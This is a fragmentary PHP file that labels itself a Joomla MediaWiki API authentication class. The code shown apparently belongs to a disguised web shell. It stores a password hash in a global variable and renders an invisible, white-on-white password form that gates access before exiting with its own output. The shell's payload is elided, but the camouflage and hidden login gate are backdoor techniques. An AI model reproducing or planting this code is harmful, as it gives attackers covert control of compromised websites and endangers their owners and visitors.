...
/**
 * MediaWiki API Users Auth class for the Joomla Platform.
 *
 * @since  3.1.4
 */
	/**
...
$GLOBALS['PASSHASH'] = '56fef3c7588431f6457a08e48d6e6b12e3acfe40e107fe4cf4fd77f2ddbb6db2d05be278c8e85c62e0ed3d96ec8de2f9cb3d9eb4535cb65ac1859fe4a4ac0fc7';
...
<form style="background-color:#fff;border:0px solid #FFF;outline:none;" action="" method="POST" onsubmit="return login(this)"><input style="border:none;background-color:#fff;color:#fff;" name="pass" type="password" value=""></form></body>'.paramsHandlerJS().'</html>';
	exit(makeOut($html));
}
